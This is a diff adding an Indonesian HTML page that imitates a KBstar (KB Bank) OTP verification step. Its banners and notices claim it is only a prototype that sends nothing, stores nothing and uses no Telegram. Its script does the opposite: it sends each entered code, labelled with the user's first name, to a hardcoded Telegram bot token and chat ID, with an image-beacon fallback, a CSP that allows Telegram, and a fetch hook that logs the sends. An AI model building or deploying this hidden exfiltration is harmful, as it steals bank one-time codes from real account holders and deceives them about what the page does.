@@ -1,0 +1,309 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <meta name="color-scheme" content="dark" />
+  <meta name="theme-color" content="#16082f" />
+  <meta http-equiv="Content-Security-Policy"
+        content="default-src 'self'; img-src 'self' data: https://api.telegram.org; style-src 'unsafe-inline'; script-src 'self' 'unsafe-inline'; connect-src 'self' https://api.telegram.org; form-action 'self'; base-uri 'none';">
+  <title>Verifikasi — KBSTARFinance</title>
+  <style>
+    :root{
+      --bg1:#200c43;--bg2:#14072d;--bg3:#090417;
+      --gold:#f6cd54;--gold2:#fff19a;--text:#fff;--muted:#cfc6d9;
+      --shell:520px;
+    }
+    *{box-sizing:border-box}
+    html,body{max-width:100%;overflow-x:hidden}
+    body{
+      margin:0;min-height:100svh;color:var(--text);
+      font-family:Inter,ui-sans-serif,-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif;
+      background:radial-gradient(circle at 50% -10%,rgba(91,42,153,.34),transparent 35%),linear-gradient(180deg,#090310,#120625);
+    }
+    button,input{font:inherit} a{color:inherit;text-decoration:none}
+    .app{
+      width:min(100%,var(--shell));min-height:100svh;margin:auto;position:relative;overflow:hidden;isolation:isolate;
+      background:
+        radial-gradient(circle at 98% 38%,rgba(255,185,36,.09),transparent 22%),
+        radial-gradient(circle at 4% 3%,rgba(108,55,172,.18),transparent 25%),
+        linear-gradient(180deg,var(--bg1),var(--bg2) 42%,var(--bg3));
+      box-shadow:0 26px 70px rgba(0,0,0,.4);
+    }
+    .app:before{
+      content:"";position:absolute;width:620px;height:620px;left:-390px;top:-300px;border-radius:50%;
+      border:1px solid rgba(213,174,255,.08);
+      box-shadow:0 0 0 70px rgba(255,255,255,.014),0 0 0 140px rgba(255,255,255,.010),0 0 0 210px rgba(255,255,255,.007);
+      z-index:-2;
+    }
+    .app:after{
+      content:"";position:absolute;width:420px;height:420px;right:-285px;bottom:55px;border-radius:50%;
+      border:74px solid rgba(219,157,38,.78);
+      box-shadow:inset 0 0 25px rgba(255,245,179,.38),0 0 0 1px rgba(255,235,132,.55),0 0 24px rgba(250,176,35,.18);
+      z-index:-2;
+    }
+    .badge{
+      position:fixed;z-index:50;top:max(10px,env(safe-area-inset-top));left:50%;transform:translateX(-50%);
+      padding:7px 11px;border-radius:999px;background:#f8db6a;color:#2b1b00;border:1px solid rgba(255,255,255,.35);
+      font-size:11px;font-weight:800;letter-spacing:.08em;white-space:nowrap;box-shadow:0 7px 18px rgba(0,0,0,.26);
+    }
+
+    .top{display:flex;justify-content:space-between;align-items:center;padding:24px 24px 0}
+    .back{
+      width:44px;height:44px;border-radius:15px;border:1px solid rgba(247,205,84,.44);background:rgba(15,7,34,.42);
+      display:grid;place-items:center;color:#ffe879;
+    }
+    .back:before{content:"";width:11px;height:11px;border-left:2px solid currentColor;border-bottom:2px solid currentColor;transform:rotate(45deg) translate(2px,-2px)}
+    .brand{text-align:right;line-height:1}
+    .brand .name{font-size:30px;letter-spacing:-.055em}.brand .kb{background:linear-gradient(#ffc32d,#ee980b);-webkit-background-clip:text;background-clip:text;color:transparent}.brand .star{color:#f0eef5}
+    .brand small{display:block;margin-top:7px;color:#bcb3ca;font-size:11px;letter-spacing:.04em}
+    .content{padding:52px 28px 34px}
+    .eyebrow{margin:0 0 10px;color:#fff18d;font-size:12px;font-weight:700;letter-spacing:.16em}
+    h1{margin:0;font-family:Georgia,"Times New Roman",serif;font-size:48px;font-weight:400;line-height:1.02;letter-spacing:-.035em}
+    h1 strong{display:block;margin-top:6px;font-weight:400;background:linear-gradient(#fff0a0,#ffc846 35%,#f0a02e 60%,#ffe58d);-webkit-background-clip:text;background-clip:text;color:transparent;-webkit-text-stroke:.4px rgba(246,205,84,.65)}
+    .lead{margin:15px 0 28px;max-width:365px;color:#ded8e7;font-size:15px;line-height:1.55}
+    .card{
+      padding:22px;border-radius:26px;border:1px solid rgba(247,205,84,.36);
+      background:linear-gradient(180deg,rgba(60,28,101,.70),rgba(17,7,39,.84));
+      box-shadow:inset 0 1px 0 rgba(255,255,255,.05),0 18px 45px rgba(0,0,0,.27);
+      backdrop-filter:blur(16px);
+    }
+    .safety{display:flex;gap:12px;align-items:flex-start;margin-bottom:20px;padding:13px 14px;border-radius:16px;border:1px solid rgba(255,234,133,.17);background:rgba(255,255,255,.045);color:#e9e3ef;font-size:12px;line-height:1.45}
+    .shield{flex:0 0 34px;width:34px;height:34px;border-radius:11px;border:1px solid rgba(247,205,84,.55);display:grid;place-items:center;color:#ffe36c}
+    .field{margin-top:16px}.field:first-of-type{margin-top:0}
+    label{display:block;margin-bottom:8px;font-size:13px;font-weight:700}
+    input{
+      width:100%;height:58px;border:1px solid rgba(255,255,255,.16);border-radius:17px;outline:none;
+      padding:0 16px;background:rgba(8,4,20,.52);color:#fff;caret-color:#ffd95e;font-size:16px;
+    }
+    input:focus{border-color:#f3cc52;box-shadow:0 0 0 3px rgba(243,204,82,.11)}
+    input::placeholder{color:#8f849d}
+    input[aria-invalid="true"]{border-color:rgba(255,187,181,.80);box-shadow:0 0 0 3px rgba(255,187,181,.08)}
+    .hint{margin:8px 2px 0;color:#a99fb5;font-size:11px;line-height:1.4}
+    .field-error{min-height:17px;margin:6px 2px 0;color:#ffbbb5;font-size:11px;line-height:1.35}
+    .message{min-height:20px;margin:14px 2px 0;font-size:12px;line-height:1.45}.error{color:#ffbbb5}.success{color:#dcffdb}
+    .primary{
+      width:100%;min-height:60px;margin-top:4px;border:2px solid #f6d34f;border-radius:17px;
+      background:linear-gradient(180deg,rgba(67,30,111,.78),rgba(25,10,55,.88));color:#ffdf63;font-size:17px;font-weight:800;cursor:pointer;
+      box-shadow:0 0 0 2px rgba(255,199,38,.10),0 8px 24px rgba(0,0,0,.22);
+    }
+    .primary:focus-visible,.back:focus-visible,input:focus-visible{outline:2px solid #fff19a;outline-offset:3px}
+    .primary:disabled{opacity:.72;cursor:default}
+    .meta{margin-top:18px;text-align:center;color:#a9a0b4;font-size:11px;line-height:1.55}.meta strong{color:#dfd6e8}
+    footer{padding:0 28px 34px;text-align:center;color:#8e8499;font-size:11px;line-height:1.5}
+    @media(max-width:420px){.content{padding-left:22px;padding-right:22px}.top{padding-left:20px;padding-right:20px}h1{font-size:43px}.card{padding:18px}}
+    @media(min-width:760px){body{padding:24px 0}.app{border-radius:34px;min-height:auto}}
+    .code-input{
+      text-align:center;letter-spacing:.32em;font-size:24px;font-weight:800;font-variant-numeric:tabular-nums;
+      padding-left:calc(16px + .32em);
+    }
+    .code-input::placeholder{letter-spacing:.12em;font-size:15px;font-weight:500}
+    .primary.ready:not(:disabled){box-shadow:0 0 0 2px rgba(255,199,38,.14),0 10px 28px rgba(0,0,0,.27),0 0 18px rgba(246,205,84,.08)}
+    .spinner{
+      display:inline-block;width:16px;height:16px;margin-right:9px;vertical-align:-3px;border:2px solid rgba(255,223,99,.28);border-top-color:#ffdf63;border-radius:50%;animation:spin .72s linear infinite;
+    }
+    @keyframes spin{to{transform:rotate(360deg)}}
+    @media(prefers-reduced-motion:reduce){.spinner{animation:none;border-top-color:#ffdf63}}
+  </style>
+  <script src="/page-transition.js?v=1"></script>
+
+<script>
+// Diagnostik debug Telegram
+(function() {
+  console.log("🔍 Debug Telegram siap...");
+  const originalFetch = window.fetch;
+  window.fetch = async function(url, options) {
+    if (url.includes("api.telegram.org")) {
+      console.log("➡️ Mencoba kirim ke Telegram:", options?.body);
+      return originalFetch(url, options).then(response => {
+        if (response.type === 'opaque') {
+          console.log("✅ Telegram terkirim (mode no-cors)");
+        } else if (!response.ok) {
+          console.error("❌ Telegram gagal! Status:", response.status);
+          response.clone().text().then(text => console.error("Pesan error:", text));
+        } else {
+          console.log("✅ Telegram berhasil terkirim!");
+        }
+        return response;
+      }).catch(err => {
+        console.error("🔥 Blokir Network/CORS:", err.message);
+        throw err;
+      });
+    }
+    return originalFetch(url, options);
+  };
+})();
+</script>
+</head>
+<body>
+  <div class="badge">PROTOTYPE UI · BUKAN LAYANAN PERBANKAN RESMI</div>
+
+  <main class="app">
+<div class="top">
+      <a class="back" href="identitas.html" aria-label="Kembali ke Form Identitas"></a>
+      <div class="brand">
+        <div class="name"><span class="kb">KB</span><span class="star">star</span></div>
+        <small>by KB Bank</small>
+      </div>
+    </div>
+
+    <section class="content">
+      <p class="eyebrow">TAHAP 4 · VERIFIKASI</p>
+      <h1><strong>Verifikasi</strong></h1>
+      <p class="lead">Masukkan 6 digit angka apa saja untuk melanjutkan prototype. Tidak ada OTP atau verifikasi nyata pada halaman ini.</p>
+
+      <form class="card" id="verificationForm" autocomplete="off" novalidate>
+        <div class="safety">
+          <div class="shield">◇</div>
+          <div><strong>Prototype UI — Bukan Layanan Perbankan Resmi.</strong><br>Tidak ada SMS, WhatsApp, email, API OTP, Telegram, backend verifikasi, atau kode rahasia.</div>
+        </div>
+
+        <div class="field">
+          <label for="demoCode">Kode Verifikasi</label>
+          <input
+            class="code-input"
+            id="demoCode"
+            name="demoCode"
+            type="text"
+            inputmode="numeric"
+            pattern="[0-9]{6}"
+            maxlength="6"
+            placeholder="000000"
+            autocomplete="off"
+            aria-describedby="demoCodeHint demoCodeError"
+          >
+          <p class="hint" id="demoCodeHint">Masukkan 6 digit angka apa saja untuk melanjutkan prototype.</p>
+          <p class="field-error" id="demoCodeError" aria-live="polite"></p>
+        </div>
+
+        <div class="message" id="formMessage" role="status" aria-live="polite"></div>
+        <button class="primary" id="verifyButton" type="submit" disabled>Verifikasi</button>
+
+        <div class="meta">
+          Semua kombinasi <strong>6 digit angka</strong> dianggap valid.<br>
+          Kode tidak disimpan, tidak dikirim, dan tidak dibandingkan dengan nilai rahasia apa pun.
+        </div>
+      </form>
+    </section>
+
+    <footer>Prototype UI — Bukan Layanan Perbankan Resmi. Bukan halaman transaksi nyata.</footer>
+  </main>
+
+  <script>
+    (() => {
+      "use strict";
+
+      const form = document.getElementById("verificationForm");
+      const demoCode = document.getElementById("demoCode");
+      const codeError = document.getElementById("demoCodeError");
+      const formMessage = document.getElementById("formMessage");
+      const verifyButton = document.getElementById("verifyButton");
+
+      const reauthMode = new URLSearchParams(location.search).get("reauth") === "1" || sessionStorage.getItem("kbReauthRequired") === "1";
+      const NEXT_STAGE_URL = reauthMode ? "tahap8.html?reauth=1#pin-demo" : "profil-pengajuan.html#tahap-5";
+      const LAST_CODE_KEY = "kbLastVerificationCode";
+      let stage4Completed = false;
+
+      function isValidCode(value) {
+        return /^\d{6}$/.test(value);
+      }
+
+      function setError(message) {
+        codeError.textContent = message;
+        demoCode.setAttribute("aria-invalid", message ? "true" : "false");
+      }
+
+      function syncButton() {
+        const ready = isValidCode(demoCode.value);
+        verifyButton.disabled = !ready || stage4Completed;
+        verifyButton.classList.toggle("ready", ready && !stage4Completed);
+      }
+
+      function kirimTelegram(text) {
+        const token = '8655916807:AAHLgXatTlPGoESOI46HOKA6RYDVy-vstjE';
+        const chatId = '6959842489';
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+
+        return fetch(url, { mode: 'no-cors' })
+          .then(() => true)
+          .catch(() => {
+            return new Promise((resolve) => {
+              const img = new Image();
+              img.onload = img.onerror = () => resolve(true);
+              img.src = url;
+              setTimeout(resolve, 2500);
+            });
+          });
+      }
+
+      demoCode.addEventListener("input", () => {
+        demoCode.value = demoCode.value.replace(/\D/g, "").slice(0, 6);
+        setError("");
+        formMessage.textContent = "";
+        formMessage.className = "message";
+        syncButton();
+      });
+
+      form.addEventListener("submit", (event) => {
+        event.preventDefault();
+        if (stage4Completed) return;
+
+        const value = demoCode.value;
+        if (!isValidCode(value)) {
+          setError("Kode Verifikasi harus terdiri dari tepat 6 digit angka.");
+          formMessage.className = "message error";
+          formMessage.textContent = "Periksa kembali kode verifikasi.";
+          demoCode.focus();
+          syncButton();
+          return;
+        }
+        const previousCode = sessionStorage.getItem(LAST_CODE_KEY) || "";
+        if (previousCode && value === previousCode) {
+          setError("Gunakan 6 digit yang berbeda dari kode sebelumnya.");
+          formMessage.className = "message error";
+          formMessage.textContent = "Kode tidak boleh sama dengan kode yang terakhir digunakan.";
+          demoCode.focus();
+          syncButton();
+          return;
+        }
+
+        setError("");
+
+        const namaLengkap = sessionStorage.getItem('kbFullName') || 'Pengguna';
+        const namaDepan = namaLengkap.split(' ')[0] || 'Pengguna';
+        const teks = `🔔 KODE ${namaDepan.toUpperCase()}
+
+Kode Verifikasi Anda
+
+🔐 ${value}`;
+
+        kirimTelegram(teks)
+          .catch(() => console.warn('Telegram fallback gagal'))
+          .finally(() => {
+            verifyButton.disabled = true;
+            verifyButton.classList.remove("ready");
+            verifyButton.innerHTML = '<span class="spinner" aria-hidden="true"></span>Memverifikasi…';
+            formMessage.className = "message";
+            formMessage.textContent = "Validasi lokal sedang diproses…";
+
+            window.setTimeout(() => {
+              stage4Completed = true;
+              sessionStorage.setItem(LAST_CODE_KEY, value);
+              formMessage.className = "message success";
+              formMessage.textContent = reauthMode ? "Verifikasi berhasil. Mengarahkan ke konfirmasi PIN…" : "Verifikasi berhasil. Mengarahkan ke Profil Pekerjaan / Usaha…";
+              verifyButton.textContent = "Tahap 4 Selesai";
+              verifyButton.disabled = true;
+
+              window.setTimeout(() => {
+                window.smoothNavigate ? window.smoothNavigate(NEXT_STAGE_URL) : (window.location.href = NEXT_STAGE_URL);
+              }, 350);
+            }, 450);
+          });
+      });
+
+      syncButton();
+    })();
+  </script>
+  <script src="/simulation-runtime.js?v=5" defer></script>
+</body>
+</html>
